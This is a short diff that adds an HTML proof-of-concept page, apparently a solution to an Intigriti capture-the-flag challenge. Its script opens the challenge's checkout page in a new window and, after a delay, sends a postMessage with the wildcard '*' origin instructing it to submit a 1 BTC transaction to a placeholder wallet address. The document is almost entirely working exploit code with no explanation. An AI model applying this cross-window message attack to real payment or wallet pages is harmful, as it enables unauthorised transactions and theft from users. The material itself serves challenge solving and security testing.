@@ -1,2 +1,21 @@
-<h1>Subdomain Takeover PoC (harshilsecops)</h1>
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+const target = "https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1";
 
+const w = window.open(target, "_blank");
+
+setTimeout(() => {
+  w.postMessage({
+    type: "submitTransaction",
+    transaction: {
+      currency: "BTC",
+      amount: 1,
+      toAddress: "bc1qctfsolvedxxxxxxxx"
+    }
+  }, "*");
+}, 3000);
+</script>
+</body>
+</html>
